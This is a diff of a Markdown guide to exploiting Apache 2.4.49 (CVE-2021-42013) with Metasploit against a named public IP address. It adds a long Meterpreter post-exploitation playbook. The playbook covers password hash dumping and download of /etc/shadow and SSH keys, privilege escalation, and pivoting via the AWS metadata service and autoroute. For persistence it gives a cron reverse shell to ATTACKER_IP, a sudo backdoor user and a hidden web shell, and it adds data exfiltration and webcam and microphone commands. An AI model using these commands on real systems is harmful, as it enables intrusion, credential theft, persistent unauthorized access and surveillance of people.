@@ -257,7 +257,7 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS 15.160.68.117
 msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 8080
 msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
 msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
-msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/shell/bind_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload linux/x64/meterpreter/bind_tcp
 msf6 exploit(multi/http/apache_normalize_path_rce) > set LPORT 4444
 msf6 exploit(multi/http/apache_normalize_path_rce) > exploit
 ```
@@ -386,89 +386,659 @@ msf6 > exploit
 
 The default reverse shell tries to connect to your machine, but your router blocks it. **Always set the payload explicitly.**
 
-### Post-Exploitation
+### Post-Exploitation with Meterpreter
 
-Once you have a shell session, interact with it:
+Once you have a Meterpreter session:
 
 ```bash
 msf6 > sessions -i 1
+meterpreter >
 ```
+
+---
+
+#### Core Meterpreter Commands
+
+```bash
+# Session info
+meterpreter > sysinfo              # System information
+meterpreter > getuid               # Current user
+meterpreter > getpid               # Current process ID
+meterpreter > getprivs             # List privileges
+
+# Help
+meterpreter > help                 # List all commands
+meterpreter > help <command>       # Help for specific command
+```
+
+---
 
 #### System Reconnaissance
 
 ```bash
-# Who am I?
-whoami
-id
+# System information
+meterpreter > sysinfo
+meterpreter > shell -c "uname -a"
+meterpreter > shell -c "cat /etc/os-release"
 
-# System info
-uname -a
-cat /etc/os-release
+# Network information
+meterpreter > ifconfig             # Network interfaces
+meterpreter > arp                  # ARP table
+meterpreter > netstat              # Network connections
+meterpreter > route                # Routing table
 
-# Network info
-hostname
-cat /etc/hosts
-ip addr
+# Process management
+meterpreter > ps                   # List processes
+meterpreter > getpid               # Current PID
+meterpreter > migrate <PID>        # Migrate to another process
 
-# Running processes
-ps aux
-
-# Environment variables
-env
+# Environment
+meterpreter > getenv               # All environment variables
+meterpreter > getenv PATH          # Specific variable
 ```
+
+---
+
+#### File System Operations
+
+```bash
+# Navigation
+meterpreter > pwd                  # Current directory
+meterpreter > cd /etc              # Change directory
+meterpreter > ls                   # List files
+meterpreter > ls -la /root         # List with details
+
+# Read files
+meterpreter > cat /etc/passwd      # Display file content
+meterpreter > cat /etc/shadow      # Password hashes
+
+# Download files (to your machine)
+meterpreter > download /etc/passwd /tmp/passwd.txt
+meterpreter > download /etc/shadow /tmp/shadow.txt
+meterpreter > download -r /var/www/html /tmp/website
+
+# Upload files (to target)
+meterpreter > upload /tmp/backdoor.sh /tmp/backdoor.sh
+meterpreter > upload linpeas.sh /tmp/linpeas.sh
+
+# File operations
+meterpreter > mkdir /tmp/exfil     # Create directory
+meterpreter > rm /tmp/evidence.txt # Delete file
+meterpreter > edit /etc/hosts      # Edit file in vim
+meterpreter > search -f *.conf     # Search for files
+meterpreter > search -f *password* # Find password files
+```
+
+---
 
 #### Credential Harvesting
 
 ```bash
-# Read passwd file
-cat /etc/passwd
+# Hash dumping
+meterpreter > hashdump             # Dump password hashes (requires root)
 
-# Read shadow file (if readable)
-cat /etc/shadow
+# Search for credentials
+meterpreter > search -f *.conf -d /etc
+meterpreter > search -f *password* -d /
+meterpreter > search -f *.env -d /var/www
+meterpreter > search -f id_rsa -d /
 
-# Find config files with passwords
-find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
-find / -name "*.env" 2>/dev/null
+# Download sensitive files
+meterpreter > download /etc/shadow
+meterpreter > download /root/.ssh/id_rsa
+meterpreter > download /root/.bash_history
 
-# Apache config
-cat /usr/local/apache2/conf/httpd.conf
-
-# Check for SSH keys
-ls -la /root/.ssh/
-cat /root/.ssh/id_rsa 2>/dev/null
-```
-
-#### Website Defacement
-
-```bash
-# Deface the website
-echo '<html><body style="background:#000;color:#0f0;text-align:center;padding-top:200px;"><h1>YOU ARE HACKED!</h1><p>CVE-2021-42013 - Apache 2.4.49 RCE</p></body></html>' > /usr/local/apache2/htdocs/index.html
-
-# Verify
-cat /usr/local/apache2/htdocs/index.html
-```
-
-#### Persistence (Optional)
-
-```bash
-# Create backdoor user
-useradd -m -s /bin/bash hacker
-echo "hacker:hacked123" | chpasswd
-
-# Add SSH key (if SSH available)
-mkdir -p /root/.ssh
-echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
-```
-
-#### Exit Session
-
-```bash
-# Background the session
-background
-# or Ctrl+Z
-
-# Kill the session
-sessions -k 1
+# Post modules for credential gathering
+meterpreter > run post/linux/gather/hashdump
+meterpreter > run post/multi/gather/ssh_creds
+meterpreter > run post/linux/gather/enum_configs
 ```
 
 ---
+
+#### Privilege Escalation
+
+```bash
+# Check current privileges
+meterpreter > getuid
+meterpreter > getprivs
+
+# Automated privesc suggestions
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Manual checks via shell
+meterpreter > shell
+$ sudo -l                          # Sudo permissions
+$ find / -perm -4000 2>/dev/null   # SUID binaries
+$ find / -perm -2000 2>/dev/null   # SGID binaries
+$ cat /etc/crontab                 # Cron jobs
+$ exit
+```
+
+---
+
+#### Network Pivoting
+
+Network pivoting uses a compromised machine as a bridge to reach internal networks that your attacking machine cannot access directly.
+
+```
+YOUR MACHINE ───────► COMPROMISED HOST ───────► INTERNAL NETWORK
+(Attacker)            (The Bridge)              (Hidden targets)
+```
+
+---
+
+##### Step 1: Reconnaissance - Understand the Network
+
+First, gather information about what networks the compromised host can see:
+
+```bash
+# Check network interfaces - "What networks am I connected to?"
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : lo
+IPv4 Address : 127.0.0.1           # Loopback (ignore)
+
+Interface  2
+============
+Name         : eth0
+IPv4 Address : 172.18.0.2          # ◄── This is the host's IP
+IPv4 Netmask : 255.255.0.0         # ◄── /16 network = 65,534 possible hosts
+```
+
+```bash
+# Check routing table - "How does this host reach other networks?"
+meterpreter > route
+
+    Subnet      Netmask      Gateway     Metric  Interface
+    ------      -------      -------     ------  ---------
+    0.0.0.0     0.0.0.0      172.18.0.1  0       eth0      # Default route (internet)
+    172.18.0.0  255.255.0.0  0.0.0.0     0       eth0      # Local network (direct)
+```
+
+```bash
+# Check ARP cache - "What hosts has this machine talked to?"
+meterpreter > arp
+
+    IP address  MAC address        Interface
+    ----------  -----------        ---------
+    172.18.0.1  1e:52:6c:2d:55:d8  eth0        # Gateway discovered
+```
+
+**What we learned:**
+- Host is at `172.18.0.2` on a `/16` network
+- Gateway is `172.18.0.1`
+- Only the gateway has been contacted so far
+
+---
+
+##### Step 2: Find Additional Networks (AWS/Cloud)
+
+If you're in a Docker container on AWS EC2, find the EC2's VPC IP:
+
+```bash
+meterpreter > shell
+
+# Get EC2 instance's internal IP
+curl -s http://169.254.169.254/latest/meta-data/local-ipv4
+# Output: 10.0.1.50 (example VPC IP)
+
+# Get VPC CIDR block
+curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+# Then: curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-ipv4-cidr-block
+
+# Check what the host can reach
+cat /proc/net/arp
+ip neigh
+
+exit
+```
+
+---
+
+##### Step 3: Set Up Pivot Routes
+
+Tell Metasploit to route traffic through the Meterpreter session:
+
+```bash
+# Add route to the Docker network
+meterpreter > run autoroute -s 172.18.0.0/16
+
+# If you found a VPC network, add that too
+meterpreter > run autoroute -s 10.0.0.0/16
+
+# Verify routes are set
+meterpreter > run autoroute -p
+
+Active Routing Table
+====================
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.18.0.0         255.255.0.0        Session 1
+   10.0.0.0           255.255.0.0        Session 1
+```
+
+**What autoroute does:**
+```
+Before: Your Machine ──✗──► 172.18.0.0/16 (unreachable)
+
+After:  Your Machine ──► Meterpreter Session ──► 172.18.0.0/16 (works!)
+                         (traffic tunneled)
+```
+
+---
+
+##### Step 4: Discover Hosts on Internal Network
+
+Now scan through the pivot:
+
+```bash
+# Background the session first
+meterpreter > background
+
+# Option A: TCP Port Scan (most reliable)
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > set RHOSTS 172.18.0.0/24
+msf6 > set PORTS 22,80,443,3306,5432,8080
+msf6 > set THREADS 10
+msf6 > run
+
+# Option B: Ping Sweep
+msf6 > use post/multi/gather/ping_sweep
+msf6 > set RHOSTS 172.18.0.0/24
+msf6 > set SESSION 1
+msf6 > run
+```
+
+**Alternative: Scan from shell (no autoroute needed)**
+
+```bash
+meterpreter > shell
+
+# Quick ping sweep
+for i in $(seq 1 254); do
+  ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" &
+done
+wait
+
+# Port check using bash
+for ip in $(seq 1 10); do
+  (echo >/dev/tcp/172.18.0.$ip/80) 2>/dev/null && echo "172.18.0.$ip:80 open"
+  (echo >/dev/tcp/172.18.0.$ip/22) 2>/dev/null && echo "172.18.0.$ip:22 open"
+done
+
+# Check ARP table for discovered hosts
+cat /proc/net/arp
+
+exit
+```
+
+---
+
+##### Step 5: Port Forwarding (Access Specific Services)
+
+Forward internal ports to your local machine:
+
+```bash
+meterpreter > portfwd add -l 3306 -p 3306 -r 172.18.0.100
+#                         │       │       └── Remote host (internal)
+#                         │       └── Remote port
+#                         └── Local port (on your machine)
+
+meterpreter > portfwd add -l 8080 -p 80 -r 172.18.0.5
+meterpreter > portfwd list
+meterpreter > portfwd delete -l 3306
+```
+
+Now you can access `172.18.0.100:3306` via `localhost:3306`:
+
+```bash
+# From your machine
+mysql -h 127.0.0.1 -P 3306 -u root -p
+```
+
+---
+
+##### Step 6: SOCKS Proxy (Full Network Access)
+
+For complete access to the internal network:
+
+```bash
+meterpreter > background
+
+# Set up SOCKS proxy
+msf6 > use auxiliary/server/socks_proxy
+msf6 > set SRVPORT 1080
+msf6 > set VERSION 5
+msf6 > run -j
+
+# Now use proxychains on your machine
+# Edit /etc/proxychains.conf: socks5 127.0.0.1 1080
+
+proxychains nmap -sT -Pn 172.18.0.0/24
+proxychains curl http://172.18.0.5
+proxychains ssh user@172.18.0.10
+```
+
+---
+
+##### Pivoting Summary
+
+| Step | Command | Purpose |
+|------|---------|---------|
+| 1 | `ipconfig` | Find what networks exist |
+| 2 | `route` | See how traffic flows |
+| 3 | `arp` | See known hosts |
+| 4 | `run autoroute -s <network>` | Route traffic through session |
+| 5 | `auxiliary/scanner/portscan/tcp` | Scan internal network |
+| 6 | `portfwd add -l -p -r` | Access specific services |
+| 7 | `auxiliary/server/socks_proxy` | Full network proxy |
+
+---
+
+##### Visual: Complete Pivot Flow
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│                        PIVOTING PROCESS                             │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. RECON              2. AUTOROUTE           3. SCAN/EXPLOIT       │
+│  ─────────             ───────────            ───────────────       │
+│                                                                     │
+│  ┌─────────┐          ┌─────────┐            ┌─────────┐           │
+│  │ ipconfig│          │autoroute│            │ portscan│           │
+│  │ route   │────────► │   -s    │──────────► │ portfwd │           │
+│  │ arp     │          │ network │            │  socks  │           │
+│  └─────────┘          └─────────┘            └─────────┘           │
+│       │                    │                      │                 │
+│       ▼                    ▼                      ▼                 │
+│  "What can I          "Send my               "Exploit the          │
+│   reach?"              traffic               internal              │
+│                        through                targets"              │
+│                        session"                                     │
+│                                                                     │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  YOUR MACHINE          PIVOT HOST             INTERNAL NETWORK      │
+│  ┌──────────┐         ┌──────────┐           ┌──────────────────┐  │
+│  │          │         │172.18.0.2│           │ 172.18.0.1 (GW)  │  │
+│  │ Attacker │◄───────►│          │◄─────────►│ 172.18.0.5 (Web) │  │
+│  │          │ Session │ Hacked   │  Direct   │ 172.18.0.10 (DB) │  │
+│  └──────────┘         │ Machine  │           │ 10.0.0.x (VPC)   │  │
+│                       └──────────┘           └──────────────────┘  │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+
+
+---
+
+#### Persistence
+
+```bash
+# SSH key persistence
+meterpreter > run post/linux/manage/sshkey_persistence
+
+# Cron persistence
+meterpreter > shell
+$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /var/spool/cron/crontabs/root
+$ exit
+
+# Backdoor user
+meterpreter > shell
+$ useradd -m -s /bin/bash backdoor
+$ echo "backdoor:password123" | chpasswd
+$ usermod -aG sudo backdoor
+$ exit
+
+# Web shell persistence
+meterpreter > upload webshell.php /var/www/html/.hidden.php
+```
+
+---
+
+#### Post-Exploitation Modules
+
+```bash
+# System enumeration
+meterpreter > run post/linux/gather/enum_system
+meterpreter > run post/linux/gather/enum_network
+meterpreter > run post/linux/gather/enum_configs
+meterpreter > run post/linux/gather/enum_protections
+
+# Credential gathering
+meterpreter > run post/linux/gather/hashdump
+meterpreter > run post/multi/gather/ssh_creds
+meterpreter > run post/linux/gather/pptpd_chap_secrets
+
+# Privilege escalation recon
+meterpreter > run post/multi/recon/local_exploit_suggester
+
+# Network recon
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24
+
+# Persistence
+meterpreter > run post/linux/manage/sshkey_persistence
+```
+
+---
+
+#### Shell Access
+
+```bash
+# Drop to system shell
+meterpreter > shell
+$ whoami
+$ id
+$ exit
+
+# Run single command
+meterpreter > shell -c "cat /etc/passwd"
+meterpreter > execute -f "/bin/bash" -c -i
+```
+
+---
+
+#### Data Exfiltration
+
+```bash
+# Download important files
+meterpreter > download /etc/passwd
+meterpreter > download /etc/shadow
+meterpreter > download /root/.ssh/id_rsa
+meterpreter > download /var/www/html/config.php
+
+# Download entire directories
+meterpreter > download -r /var/www/html /tmp/website_backup
+meterpreter > download -r /home /tmp/home_backup
+
+# Search and download
+meterpreter > search -f *.sql -d /var
+meterpreter > search -f *backup* -d /
+```
+
+---
+
+#### Session Management
+
+```bash
+# Background session (keep alive)
+meterpreter > background
+# or Ctrl+Z
+
+# List all sessions
+msf6 > sessions -l
+
+# Interact with session
+msf6 > sessions -i 1
+
+# Upgrade shell to meterpreter
+msf6 > sessions -u 1
+
+# Kill session
+msf6 > sessions -k 1
+
+# Kill all sessions
+msf6 > sessions -K
+```
+
+---
+
+#### Quick Reference Card
+
+| Command | Description |
+|---------|-------------|
+| `sysinfo` | System information |
+| `getuid` | Current user |
+| `ps` | List processes |
+| `migrate <PID>` | Move to another process |
+| `shell` | Drop to system shell |
+| `upload <src> <dst>` | Upload file to target |
+| `download <src> <dst>` | Download file from target |
+| `cat <file>` | Read file |
+| `search -f <pattern>` | Search for files |
+| `hashdump` | Dump password hashes |
+| `portfwd add -l -p -r` | Port forwarding |
+| `run autoroute -s` | Add network route |
+| `background` | Background session |
+| `sessions -i <id>` | Interact with session |
+
+---
+
+
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    chmod                     Change the permissions of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    getproxy                  Display the current proxy configuration
+    ifconfig                  Display interfaces
+    ipconfig                  Display interfaces
+    netstat                   Display the network connections
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+    route                     View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    shell                     Drop into a system command shell
+    suspend                   Suspends or resumes a list of processes
+    sysinfo                   Gets information about the remote system, such as OS
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    webcam_chat               Start a video chat
+    webcam_list               List webcams
+    webcam_snap               Take a snapshot from the specified webcam
+    webcam_stream             Play a video stream from the specified webcam
+
+
+Stdapi: Mic Commands
+====================
+
+    Command                   Description
+    -------                   -----------
+    listen                    listen to a saved audio recording via audio player
+    mic_list                  list all microphone interfaces
+    mic_start                 start capturing an audio stream from the target mic
+    mic_stop                  stop capturing audio
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the target system
